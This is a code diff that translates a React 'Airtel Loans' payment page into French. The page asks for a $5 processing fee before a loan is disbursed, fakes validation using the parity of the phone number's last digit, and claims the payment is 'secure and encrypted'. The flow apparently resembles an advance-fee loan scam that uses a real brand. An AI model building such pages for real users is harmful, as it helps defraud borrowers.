@@ -8,28 +8,28 @@ function AirtelPayment() {
 
   const handlePay = () => {
     setIsProcessing(true);
-    
-    // Simulate a payment processing delay
+
+    // Simuler un délai de traitement du paiement
     setTimeout(() => {
       setIsProcessing(false);
-      
-      // Mock validation logic: 
-      // If the phone number ends in an even number (0, 2, 4, 6, 8), it's valid (Success).
-      // If it ends in an odd number, it's invalid (Denied).
+
+      // Logique de validation simulée :
+      // Si le numéro de téléphone se termine par un chiffre pair (0, 2, 4, 6, 8), il est valide (Succès).
+      // S'il se termine par un chiffre impair, il est invalide (Refusé).
       const phone = localStorage.getItem('airtelPhone') || '';
       const lastDigit = parseInt(phone.slice(-1));
-      
+
       if (!isNaN(lastDigit) && lastDigit % 2 === 0) {
-        navigate('/airtel-success'); // Valid number
+        navigate('/airtel-success'); // Numéro valide
       } else {
-        navigate('/airtel-denied');  // Invalid number
+        navigate('/airtel-denied');  // Numéro invalide
       }
     }, 1500);
   };
 
   return (
     <div className="airtel-container">
-      {/* Header Section */}
+      {/* En-tête */}
       <div className="airtel-header">
         <div className="airtel-hamburger">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -39,35 +39,35 @@ function AirtelPayment() {
           </svg>
         </div>
         <h1 className="airtel-logo">Airtel Loans</h1>
-        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
+        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
       </div>
 
-      {/* Main White Card */}
+      {/* Carte blanche principale */}
       <div className="airtel-card">
-        {/* Back Link */}
+        {/* Lien de retour */}
         <button className="airtel-back-link" onClick={() => navigate(-1)}>
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <line x1="19" y1="12" x2="5" y2="12"></line>
             <polyline points="12 19 5 12 12 5"></polyline>
           </svg>
-          Back
+          Retour
         </button>
 
-        <h2 className="airtel-limit-heading">Pay Processing Fee</h2>
+        <h2 className="airtel-limit-heading">Payer les frais de traitement</h2>
         <p className="airtel-limit-subtext">
-          A processing fee of $5 is required to disburse your loan.
+          Des frais de traitement de 5 $ sont requis pour décaisser votre prêt.
         </p>
 
-        {/* Fee Amount Box */}
+        {/* Encadré du montant des frais */}
         <div className="airtel-limit-box">
-          <span className="airtel-limit-label">Processing Fee</span>
-          <span className="airtel-limit-amount">$5</span>
+          <span className="airtel-limit-label">Frais de traitement</span>
+          <span className="airtel-limit-amount">5 $</span>
           <span className="airtel-limit-currency">USD</span>
         </div>
 
-        {/* Payment Method Selector */}
+        {/* Sélecteur de méthode de paiement */}
         <div className="airtel-input-group">
-          <label>Select Payment Method</label>
+          <label>Sélectionnez la méthode de paiement</label>
           <div className="airtel-payment-method">
             <div className="airtel-payment-option selected">
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -81,18 +81,18 @@ function AirtelPayment() {
                 <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                 <line x1="2" y1="10" x2="22" y2="10"></line>
               </svg>
-              <span>Credit / Debit Card</span>
+              <span>Carte de crédit / débit</span>
             </div>
           </div>
         </div>
 
-        {/* Pay Button */}
-        <button 
-          className="airtel-continue-btn" 
+        {/* Bouton de paiement */}
+        <button
+          className="airtel-continue-btn"
           onClick={handlePay}
           disabled={isProcessing}
         >
-          {isProcessing ? 'Processing...' : 'Pay $5 Now'}
+          {isProcessing ? 'Traitement en cours...' : 'Payer 5 $ maintenant'}
           {!isProcessing && (
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <line x1="5" y1="12" x2="19" y2="12"></line>
@@ -101,12 +101,12 @@ function AirtelPayment() {
           )}
         </button>
 
-        {/* Footer Security Message */}
+        {/* Message de sécurité en pied de page */}
         <div className="airtel-footer">
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
           </svg>
-          <span>Your payment is secure and encrypted</span>
+          <span>Votre paiement est sécurisé et crypté</span>
         </div>
       </div>
     </div>
